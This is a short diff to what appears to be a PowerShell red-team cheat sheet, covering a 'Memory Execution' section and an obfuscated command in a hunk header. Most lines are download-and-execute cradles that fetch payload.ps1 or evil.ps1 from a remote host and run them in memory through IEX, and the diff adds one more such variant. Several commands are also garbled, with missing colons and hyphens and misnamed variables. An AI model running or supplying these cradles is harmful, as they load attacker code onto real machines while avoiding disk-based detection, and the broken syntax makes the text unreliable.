@@ -22,7 +22,7 @@ C:> sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F'
 ### Memory Execution
 ---
 ```powershell
-C:> iex New Object Net.WebClient DownloadString (('https://webserver/payload.ps1')
+C:> iex New Object Net.WebClient DownloadString('https://webserver/payload.ps1')
 ```
 ```powershell
 C:> $ie=New-Object -ComObject InternetExplorer.Application;$ie.visible ==$False;$ie.navigate('http 192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
@@ -34,6 +34,10 @@ C:> $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/
 C:> $wr=[System.NET.WebRequest]::Create("http 192.168.230.1/evil.ps1")
 C:> $r=$w. GetResponse()
 C:> IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
+```
+PSv3 Onwards:
+```powershell
+C:> iex (iwr 'http 192.168.230.1/evil.ps1')
 ```
 
 ### Disable Defender
